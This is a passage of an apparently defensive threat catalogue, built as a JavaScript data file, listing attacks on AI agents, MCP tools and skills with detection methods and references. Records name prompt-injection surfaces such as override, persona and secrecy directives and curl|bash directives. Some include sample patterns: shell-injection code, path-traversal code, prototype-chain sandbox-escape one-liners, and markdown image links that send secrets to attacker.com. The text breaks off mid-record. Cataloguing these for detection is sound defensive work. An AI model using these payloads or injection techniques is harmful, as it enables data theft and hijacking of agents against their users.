...
// built: 2026-07-18T07:19:36.620Z
// records: 59 (0 drafts excluded)
  ...
  var RECORDS = [
    {
      ...
      "provenance_vector": {
        ...
        "payload_surface": "skill-declared hook/callback registration targeting the tool dispatch layer",
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "skill instruction body: fetch()/curl/wget directive",
    ...
    },
    {
      ...
      "provenance_vector": {
        ...
        "payload_surface": "MCP tool.description field",
        "escalation": "data_to_instruction"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "skill instruction body: fund-transfer / allowance-approval directive",
        "escalation": "instruction_to_capability"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "tool_schema",
        "payload_surface": "MCP server-card tool.description field",
        "escalation": "data_to_instruction"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        ...
        "payload_surface": "literal credential string in skill file body"
      },
      "trifecta_profile": {
        "requires": [
          "private_data"
      ...
      "mitigation": {
        ...
        "trifecta_control": "break_private_data"
      },
      "example_patterns": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "skill instruction body: sub-agent delegation with full-access/inherit-permissions language",
        "escalation": "instruction_to_capability"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        ...
        "payload_surface": "outbound HTTP Host / X-Forwarded-Host / Forwarded header",
        "escalation": "instruction_to_capability"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "behavioral_vector": [
        "parasitic-tool-registration",
        "hook-injection",
        "dispatch-hijack"
      ],
      "provenance_vector": {
        "entry_class": "runtime",
        "payload_surface": "tool registry / hook-dispatch registration call at session init",
        "escalation": "instruction_to_capability"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "behavioral_vector": [
        "oauth-discovery-rebind",
        "endpoint-mismatch",
        "auth-flow-hijack"
      ],
      "provenance_vector": {
        "entry_class": "registry_metadata",
        "payload_surface": "OAuth discovery document (authorization_endpoint/token_endpoint/jwks_uri)",
        "escalation": "capability_to_identity"
      },
      "trifecta_profile": {
        "requires": [
          "external_comms"
    ...
    },
    {
      ...
      "attack_class": "Tool Abuse - Implementation Command Injection",
      "description": "An MCP tool's own server-side handler code takes a caller-supplied tool-call parameter value and passes it into a shell or system-command execution function without sanitization, argument-array separation, or allowlisting. Unlike prompt-driven tool abuse, this is a code-level flaw in the tool's implementation: no LLM reasoning or natural-language instruction is required to trigger it. A caller who can reach the tool at all -- a compromised agent, a malicious upstream tool result shaping the parameter value, or a direct unauthenticated JSON-RPC request -- can execute arbitrary OS commands under the privileges of the MCP server process. Conventional prompt-injection scanners miss this class entirely because there is no suspicious instruction text to find; the vulnerability lives in the tool's source code, not in any content the agent processes.",
      "affected_platforms": [
        "claude-desktop",
        "claude-code",
        "cursor",
      ...
      "aivss_score": 7.5,
      "cvss_base_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
      "behavioral_fingerprint": "MCP tool handler code passes a caller-supplied tool-call parameter value directly into a shell or system-command execution function without sanitization, executing arbitrary OS commands under the server process's privileges -- independent of any agent instruction or prompt content.",
      "behavioral_vector": [
        "command-injection",
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "MCP tool-call parameter value reaching an unsanitized shell/system-command execution call in the server's own handler code"
      },
      "trifecta_profile": {
        "requires": [
          "external_comms"
      ...
      "example_patterns": [
        "execAsync(`some-cli ${userSuppliedParam}`)",
        "child_process.exec(`convert ${filePath} output.png`, { shell: true })",
        "os.system(f\"ffmpeg -i {tool_param} out.mp4\")"
      ],
      "detection_methodology": "1. Static/SAST scan: flag process-execution calls (exec, execSync, execAsync, spawn/child_process with shell:true, os.system, subprocess with shell=True) where an argument traces back to a tool-call parameter without an intervening sanitization, escaping, or allowlist function. 2. Pattern scan: flag known-vulnerable shell-invocation idioms (string concatenation or template interpolation into a shell command string) as a lower-confidence secondary signal. 3. Code review: confirm the parameter's declared schema does not itself constrain the value to a safe, non-shell-meaningful format (e.g. a closed enum).",
      "indicators_of_compromise": [
        "Tool handler code passes a raw, caller-supplied string parameter directly into exec() / execSync() / child_process.exec() / execAsync() with no argument-array separation or shell-metacharacter escaping",
        "Process-execution call uses { shell: true } (or equivalent) with a caller-controlled argument string, rather than passing arguments as a separate array",
      ...
      "references": [
        ...
        {
          "tag": "Snyk",
          "text": "Command Injection in gemini-mcp-tool (SNYK-JS-GEMINIMCPTOOL-15091895)",
          "url": "https://security.snyk.io/vuln/SNYK-JS-GEMINIMCPTOOL-15091895"
        },
        {
          "tag": "GitLab Advisory Database",
          "text": "gemini-mcp-tool vulnerable to OS command injection and @file exfiltration via prompt quoting (CVE-2026-0755)",
          "url": "https://advisories.gitlab.com/npm/gemini-mcp-tool/CVE-2026-0755/"
        },
        {
          "tag": "CWE-78",
    ...
    },
    {
      ...
      "aivss_score": 7.7,
      "cvss_base_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
      "behavioral_fingerprint": "An MCP client spawns a server as a STDIO subprocess using command and args fields taken directly from configuration or registry data with no validation, executing arbitrary OS commands under the client's privileges before any MCP protocol handshake occurs.",
      "behavioral_vector": [
        "stdio-launch-injection",
        "config-to-process-execution",
        "registry-poisoning"
      ],
      "provenance_vector": {
        "entry_class": "registry_metadata",
        "payload_surface": "MCP client configuration or registry entry's command/args fields used to spawn a STDIO subprocess",
        "escalation": "instruction_to_capability"
      },
      "trifecta_profile": {
        "requires": [
      ...
      "references": [
        {
          "tag": "OX Security",
          "text": "The Mother of All AI Supply Chains -- Anthropic's \"By Design\" failure at the heart of the AI ecosystem",
          "url": "https://www.ox.security/reports/the-mother-of-all-ai-supply-chains-anthropics-by-design-failure-at-the-heart-of-the-ai-ecosystem/"
        },
        {
          "tag": "CSA Research Note",
          "text": "MCP by Design: RCE Across the AI Agent Ecosystem",
          "url": "https://labs.cloudsecurityalliance.org/research/csa-research-note-mcp-by-design-rce-ox-security-20260420-csa/"
        },
        {
          "tag": "CVE",
          "text": "CVE-2026-30615 -- Windsurf, one named platform instance of the STDIO launch config injection pattern",
      ...
      "aivss": {
        ...
        "aarf": {
          ...
          "dynamic_identity": 0,
          "persistent_memory": 0.5,
          "natural_language_input": 0.6,
          "data_access": 1,
          "external_dependencies": 0.6
        },
        "aars": 5.9,
        "thm": 1,
        "mitigation_factor": 1,
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "skill instruction body: curl|bash / wget|sh directive",
        "escalation": "instruction_to_capability"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "skill instruction body: recursive delete command",
        "escalation": "instruction_to_capability"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "skill instruction body: instruction-override language",
        "escalation": "data_to_instruction"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "skill instruction body: startup-script / cron-registration directive",
        "escalation": "instruction_to_capability"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "skill instruction body: persona-override / unrestricted-mode directive",
        "escalation": "data_to_instruction"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "skill instruction body: secrecy directive",
        "escalation": "data_to_instruction"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "skill instruction body: explicit tool-call directive with parameters",
        "escalation": "instruction_to_capability"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "skill instruction body: system-prompt interrogation directive"
      },
      "trifecta_profile": {
        "requires": [
          "untrusted_content"
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "retrieved_document",
        "payload_surface": "RAG-indexed document body",
        "escalation": "data_to_instruction"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "registry_metadata",
        "payload_surface": "MCP registry listing / server manifest identity claims",
        "escalation": "capability_to_identity"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        ...
        "payload_surface": "tool call result payload",
        "escalation": "data_to_instruction"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "runtime",
        "payload_surface": "agent-to-agent message payload",
        "escalation": "data_to_instruction"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "skill instruction body: no-confirmation directive",
        "escalation": "instruction_to_capability"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "runtime",
        "payload_surface": "tool/skill output volume flooding the context window"
      },
      "trifecta_profile": {
        "requires": [
          "untrusted_content"
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "skill_file",
        "payload_surface": "skill file bytes vs. declared extension",
        "escalation": "instruction_to_capability"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "fabricated prior-turn content injected into context",
        "escalation": "data_to_instruction"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "tool call parameters/return values carrying encoded payload",
        "escalation": "instruction_to_capability"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "instruction directing retention across turns/sessions",
        "escalation": "data_to_instruction"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        ...
        "payload_surface": "user-supplied file/document body",
        "escalation": "data_to_instruction"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "text content containing homoglyph, zero-width, or bidi control characters"
      },
      "trifecta_profile": {
        "requires": [
          "untrusted_content"
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "skill instruction body: role-claim trust rule",
        "escalation": "capability_to_identity"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "agent-generated output targeting a training/RLHF feedback pipeline"
      },
      "trifecta_profile": {
        "requires": [
          "untrusted_content"
      ...
      "mitigation": {
        ...
        "enforcement_point": "downstream_system",
        "trifecta_control": "break_untrusted_content"
      },
      "mutation_count": 4,
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "skill instruction body: eval/pickle/yaml.load of untrusted data",
        "escalation": "instruction_to_capability"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "skill instruction body: dynamic-import-from-URL directive",
        "escalation": "instruction_to_capability"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "tool_response",
        "payload_surface": "sensor/environment tool-response payload",
        "escalation": "data_to_instruction"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "skill instruction body: pivot-to-other-systems directive",
        "escalation": "capability_to_identity"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "user_input",
        "payload_surface": "image/screenshot pixel content",
        "escalation": "data_to_instruction"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "skill instruction body: unlimited-tool-use / sub-agent-spawn grant",
        "escalation": "instruction_to_capability"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "output text carrying steganographic/covert encoding",
        "escalation": "instruction_to_capability"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "agent output passed unescaped to a downstream interpreter (SQL/HTML/shell)",
        "escalation": "instruction_to_capability"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "provenance_vector": {
        "entry_class": "tool_response",
        "payload_surface": "tool result content passed into eval()/exec()/dynamic code string",
        "escalation": "instruction_to_capability"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "behavioral_vector": [
        "ui-payload-injection",
        "hidden-element",
        "rich-ui-abuse"
      ],
      "provenance_vector": {
        "entry_class": "tool_response",
        "payload_surface": "rich UI payload (canvas/artifact/SVG/HTML) non-rendered elements",
        "escalation": "data_to_instruction"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "behavioral_vector": [
        "cross-app-pivot",
        "confused-deputy",
        "trust-boundary-cross"
      ],
      "provenance_vector": {
        "entry_class": "tool_response",
        "payload_surface": "low-trust MCP server tool description/result referencing a co-connected high-trust server",
        "escalation": "capability_to_identity"
      },
      "trifecta_profile": {
        "requires": [
    ...
    },
    {
      ...
      "aivss_score": 6.3,
      "cvss_base_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:H/SI:L/SA:N",
      "behavioral_fingerprint": "MCP resource or file-handler tool's own path-validation code fails to canonicalize and contain a caller-supplied path or URL parameter, allowing directory-traversal sequences to read or write files and resources outside the tool's declared scope.",
      "behavioral_vector": [
        "path-traversal",
      ...
      "provenance_vector": {
        "entry_class": "content",
        "payload_surface": "MCP resource/file-handler tool-call path or URL parameter reaching an unsanitized path-resolution function in the server's own handler code"
      },
      "trifecta_profile": {
        "requires": [
          "external_comms"
      ...
      "example_patterns": [
        "if path.startswith('/etc') or path.startswith('/root'): raise ValueError()  # blacklist, not containment",
        "open(base_dir + '/' + user_path)  # no normalization before use",
        "fetch(`${apiBase}${userSuppliedPath}`)  // dot-segments normalized during URL resolution, escaping apiBase"
      ],
      "detection_methodology": "1. Static/SAST scan: flag path-validation functions using substring/prefix blacklist checks (e.g. startswith() against a denylist) instead of canonical-path resolution plus containment verification against a configured root. 2. Pattern scan: flag file-open/read/write calls or URL builders where a tool-call parameter reaches the call without a preceding path-resolution or containment-check function. 3. Code review: confirm URL-based resource builders apply the same canonicalization as filesystem path handlers -- dot-segment normalization during URL resolution is a common blind spot.",
      "indicators_of_compromise": [
        "Path-validation function uses exact string-match blacklisting instead of canonical-path resolution and containment checking (e.g. checking startswith() against a denylist rather than resolving to a real path and verifying it stays under a configured root)",
        "A file-path or resource-URI parameter is passed to a file-open/read/write call or URL builder without prior normalization against a configured root directory",
      ...
      "references": [
        {
          "tag": "CVE",
          "text": "CVE-2026-11720 -- Google MCP Toolbox for Databases, HTTP tool URL builder path traversal, CVSS 9.3",
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-11720"
        },
        {
          "tag": "CVE",
          "text": "CVE-2025-66689 -- Zen MCP Server path traversal via is_dangerous_path() blacklist bypass, CVSS 6.5",
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-66689"
        },
        {
          "tag": "CVE",
          "text": "CVE-2026-15138 -- tumf mcp-text-editor path traversal via _validate_file_path",
    ...
    },
    {
      ...
      "schema_version": "1.1.0",
      "component_type": "tool",
      "title": "Code-execution sandbox escape via JavaScript prototype-chain traversal",
      "attack_class": "Execution Hijack - Code Execution Sandbox Escape",
      ...
      "affected_platforms": [
        ...
        "cursor",
        "codex",
        "any-agent-with-code-execution-tool"
      ],
      "affected_registries": [
        "npm",
        "pypi"
      ...
      "behavioral_fingerprint": "A code-execution tool's sandbox fails to contain a submitted payload that uses prototype-chain traversal to reach the host JavaScript or Python runtime, achieving code execution with host-level privileges outside the tool's declared execution boundary.",
      "behavioral_vector": [
        "sandbox-escape",
      ...
      "provenance_vector": {
        "entry_class": "runtime",
        "payload_surface": "code submitted to a code-execution/sandbox tool, containing a prototype-chain-traversal payload targeting the host language runtime"
      },
      "trifecta_profile": {
        "requires": [
          "untrusted_content"
      ...
      "example_patterns": [
        ...
        "Object.getPrototypeOf(Object.getPrototypeOf([])).constructor.constructor(\"return this\")()",
        "this.__proto__.__proto__.constructor.constructor(\"return globalThis\")()"
      ],
      "detection_methodology": "1. Pre-execution pattern scan: flag code submitted to a code-execution tool containing prototype-chain manipulation idioms (__proto__, constructor.constructor, Object.getPrototypeOf chained toward global/host scope) as a heuristic signal, not confirmation of an actual escape. 2. Runtime/sandbox observation: monitor the sandboxed process for filesystem, network, or process-table access outside its declared execution boundary -- this confirms an actual escape rather than a mere attempt. 3. Semantic review: an LLM-based reviewer can recognize novel or obfuscated escape techniques that a fixed pattern signature misses.",
      "indicators_of_compromise": [
        "Executed code contains prototype-chain manipulation patterns (e.g. __proto__, constructor.constructor) targeting the host JavaScript or Python runtime rather than objects within the sandboxed execution context",
        "Sandbox/code-execution process observed accessing host-level resources (filesystem paths outside the declared working directory, network interfaces, process list, environment variables) outside its declared execution boundary",
      ...
      "references": [
        {
          ...
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-5752"
        },
        {
          "tag": "CWE-693",
    ...
    },
    {
      ...
      "example_patterns": [
        "![status](https://attacker.com/leak?data=SENSITIVE_ANSWER_CONTENT)",
        "[reference-style link][1]\n\n[1]: https://attacker.com/x?d=CONVERSATION_SUMMARY",
        "<img src=\"https://log.attacker.io/beacon?q=API_KEY_VALUE\">"
      ],
      "detection_methodology": "1. Runtime output scan: inspect agent-generated responses before rendering for image/link URLs whose query parameters or path segments contain content that appears sourced from the conversation, prior tool results, or context, rather than a static/known asset identifier. 2. Network monitoring: flag outbound requests immediately following response rendering to domains not previously referenced anywhere in the session. 3. Semantic review: an LLM-based reviewer can recognize when a URL's parameter values look like exfiltrated content versus a legitimate asset reference.",
      "indicators_of_compromise": [
        "Agent-generated response contains a markdown image or link reference whose URL includes a query parameter carrying content sourced from the conversation or context, rather than a static or previously-known asset URL",
        ...
        "Response markdown uses reference-style link/image syntax in a way that evades simple substring link-redaction filters scanning only inline URLs"
      ],
      ...
      "references": [
        {
          "tag": "CVE",
          "text": "CVE-2025-32711 -- \"EchoLeak\", zero-click prompt injection in Microsoft 365 Copilot enabling stealth data exfiltration. CVSS 7.5 (NIST) / 9.3 (Microsoft CNA) -- two independent assessments, both cited rather than one chosen",
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-32711"
        },
        {
          "tag": "arXiv",
          "text": "EchoLeak: The First Real-World Zero-Click Prompt Injection Exploit in a Production LLM System (peer-reviewed, also published via AAAI Symposium Series)",
